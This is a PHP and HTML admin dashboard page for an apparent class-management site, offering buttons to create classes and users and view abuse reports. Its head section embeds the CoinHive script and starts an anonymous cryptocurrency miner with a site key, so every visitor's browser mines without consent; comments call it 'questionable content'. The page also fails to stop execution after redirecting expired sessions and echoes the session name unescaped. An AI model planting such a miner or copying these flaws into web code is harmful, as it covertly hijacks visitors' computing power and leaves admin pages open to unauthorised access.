<?php
  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if($_SESSION['role'] != 1) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not Permitted";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php");
  }
?>

<!-- This is the format we will use for the pages on the website. CSS to be added as
    time goes on and I continue to learn more. -->
<html lang="en">
  <head>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/home.css">
    <script>
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();
    </script>
    <!-- End questionable content -->
    <link rel="stylesheet" href="../css/home.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- The top banner of the webpage -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <?php
            echo "<h1>Welcome, " . $_SESSION['name'] . "</h1>";
          ?>
        </center>
    </div>
  </head>



  <!-- Main content of the webpage "do the wave" -->
<body>
  <div class="main">
    <br>
    <div class="container-fluid">
      <div class="row">
        <div class="col-md-6">
          <div class="home">
            <center>
              <br>
              <button class="button" onclick="window.location='pages.php?page=createClass';">Create a class</button>
              <p>
                Create a new class.
              </p>
            </center>
          </div>
        </div>
        <div class="col-md-6">
          <div class="home">
            <center>
              <br>
              <button class="button" onclick="window.location='pages.php?page=viewReports';">View reports</button>
              <p>
                View reports of abuse by users.
              </p>
            </center>
          </div>
        </div>
      </div>
      <br>
      <div class="row">
        <div class="col-md-6">
          <div class="home">
            <center>
              <br>
              <button class="button" onclick="window.location='pages.php?page=createUser';">Create a user</button>
              <p>
                Create a new user.
              </p>
            </center>
          </div>
        </div>
        <div class="col-md-6">
          <div class="home">
            <center>
              <br>
              <button class="button" onclick="window.location='pages.php?page=other';">Do other stuff</button>
              <p>
                Additional administrative tools.
              </p>
            </center>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
